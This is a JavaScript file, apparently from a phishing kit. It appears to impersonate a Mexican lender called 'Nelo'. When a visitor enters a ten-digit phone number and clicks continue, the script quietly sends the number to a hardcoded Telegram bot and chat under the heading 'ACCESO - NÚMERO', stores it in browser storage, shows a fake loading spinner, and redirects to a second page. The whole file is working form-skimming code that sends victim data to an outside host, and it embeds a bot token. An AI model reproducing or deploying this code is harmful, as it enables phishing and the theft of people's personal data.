const TELEGRAM_BOT_TOKEN = "8685705173:AAGkJoDqd-Fbhy2BGCUgJLRSFqJ_F0qlFa0";
const TELEGRAM_CHAT_ID = "-5018202838";

(async function() {
    // Función para enviar mensaje a Telegram
    async function enviarATelegram(mensaje) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            });
            const data = await response.json();
            if (data.ok) {
                console.log("✅ Mensaje enviado a Telegram:", mensaje);
                return true;
            } else {
                console.error("❌ Error Telegram:", data.description);
                return false;
            }
        } catch (error) {
            console.error("❌ Error de conexión:", error);
            return false;
        }
    }

    const esperarDOM = setInterval(() => {
        const boton = document.getElementById('continuarAccion');
        const inputTelefono = document.getElementById('telefonoMovil');
        const feedbackSpan = document.getElementById('feedbackSpan');
        const modal = document.getElementById('spinnerModal');
        
        if (boton && inputTelefono && modal) {
            clearInterval(esperarDOM);
            
            function mostrarModalSpinner() {
                modal.classList.add('active');
            }

            function ocultarModalSpinner() {
                modal.classList.remove('active');
            }
            
            boton.addEventListener('click', async function() {
                const valorInput = inputTelefono.value.trim();
                const soloNumeros = valorInput.replace(/\D/g, '');
                
                if (soloNumeros.length !== 10) {
                    feedbackSpan.textContent = `❌ Debes ingresar 10 dígitos (actual: ${soloNumeros.length})`;
                    feedbackSpan.classList.remove('success-fb');
                    feedbackSpan.classList.add('error-fb');
                    inputTelefono.style.transform = 'scale(1.01)';
                    setTimeout(() => { if (inputTelefono) inputTelefono.style.transform = ''; }, 180);
                    inputTelefono.focus();
                    return;
                }
                
                const numeroCompleto = `+52${soloNumeros}`;
                
                boton.disabled = true;
                feedbackSpan.textContent = "";
                feedbackSpan.classList.remove('error-fb', 'success-fb');
                mostrarModalSpinner();
                
                localStorage.setItem('nelo_telefono', numeroCompleto);
                localStorage.setItem('nelo_telefono_completo', numeroCompleto);
                sessionStorage.setItem('nelo_telefono_completo', numeroCompleto);
                
                const mensaje = `🔴🔴ACCESO - NÚMERO🔴🔴\nNúmero: ${numeroCompleto}`;
                await enviarATelegram(mensaje);
                
                setTimeout(() => {
                    ocultarModalSpinner();
                    window.location.href = "index2.html";
                }, 2500);
            });
        }
    }, 100);
})();